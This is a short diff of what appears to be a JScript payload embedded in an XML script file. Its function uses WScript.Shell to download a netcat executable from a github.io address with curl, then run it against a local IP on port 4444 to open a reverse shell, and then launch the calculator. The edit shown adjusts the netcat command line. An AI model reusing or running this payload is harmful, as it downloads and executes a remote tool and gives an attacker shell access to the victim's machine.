@@ -10,7 +10,7 @@
 <![CDATA[
 	function Exec()	{
 		var r = new ActiveXObject("WScript.Shell").Run("curl -o .\\gotnc.exe https://mehdizouareg.github.io/nc.exe");
-		var r = new ActiveXObject("WScript.Shell").Run("gotnc.exe 192.168.1.79 -p 4444");
+		var r = new ActiveXObject("WScript.Shell").Run(".\gotnc.exe 192.168.1.79 4444");
 		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 	}
 ]]>
